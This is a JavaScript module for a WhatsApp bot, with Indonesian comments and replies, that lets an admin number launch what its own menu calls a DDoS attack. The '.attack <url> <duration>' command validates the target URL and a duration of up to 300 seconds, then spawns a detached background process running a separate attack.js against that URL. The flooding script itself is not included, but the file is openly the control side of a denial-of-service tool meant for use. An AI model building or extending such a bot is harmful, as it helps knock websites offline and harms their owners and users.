const { spawn } = require('child_process');

module.exports = (sock, message, config) => {
    const body = message.message.conversation || message.message.extendedTextMessage?.text || '';
    const from = message.key.remoteJid;

    // Cek apakah pengirim adalah admin
    if (from !== config.adminNumber) {
        return sock.sendMessage(from, { text: 'Maaf, hanya admin yang dapat menggunakan bot ini.' });
    }

    if (body === '.menu') {
        const menuText = `
*Menu Bot*
- .menu : Menampilkan menu
- .attack <url> <duration> : Melakukan serangan DDoS ke url selama duration (detik)
        `;
        sock.sendMessage(from, { text: menuText });
    } else if (body.startsWith('.attack')) {
        const args = body.split(' ');
        if (args.length < 3) {
            return sock.sendMessage(from, { text: 'Format salah. Gunakan: .attack <url> <duration>' });
        }

        const url = args[1];
        const duration = parseInt(args[2]);

        // Validasi URL
        try {
            new URL(url);
        } catch (e) {
            return sock.sendMessage(from, { text: 'URL tidak valid.' });
        }

        // Validasi duration
        if (isNaN(duration) || duration <= 0 || duration > 300) {
            return sock.sendMessage(from, { text: 'Duration harus antara 1-300 detik.' });
        }

        // Jalankan attack
        const attackProcess = spawn('node', [__dirname + '/attack.js', url, duration.toString()], {
            detached: true,
            stdio: 'ignore'
        });

        attackProcess.unref();

        sock.sendMessage(from, { text: `Memulai serangan ke ${url} selama ${duration} detik.` });
    }
};